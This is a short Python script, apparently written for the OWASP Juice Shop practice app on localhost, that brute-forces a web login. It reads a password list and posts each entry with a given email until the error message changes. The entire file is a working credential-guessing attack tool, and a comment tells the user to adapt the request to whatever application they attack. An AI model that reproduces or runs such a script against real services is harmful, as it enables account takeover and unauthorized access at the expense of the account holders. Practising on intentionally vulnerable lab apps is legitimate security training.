import requests
import argparse


#Args and help
parser = argparse.ArgumentParser(description='Login Password BruteForce')
parser.add_argument('-u', dest='user', help='Email or Password', required=True)
parser.add_argument('-r', dest='file', type=str, help='Password List', required=True)
args = parser.parse_args()

# You Can change request based on application you Attack
url = "http://127.0.0.1:3000/rest/user/login"
cookies = {"language": "en", "welcomebanner_status": "dismiss"}
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "application/json, text/plain, */*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "http://127.0.0.1:3000", "Connection": "close", "Referer": "http://127.0.0.1:3000/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}
f = open(args.file, "r")  #Open file the user passed after -r 

for i in f.readlines():
	password = i.rstrip("\n")
	json = {"email": args.user, "password": password}  #Use password from List and User which user passed after -u
	r = requests.post(url, headers=headers, cookies=cookies, json=json)
	if r.text == "Invalid email or password.": #Change this Based on response.
		pass
	else:
		print('Password Found !!   ', password)
		break


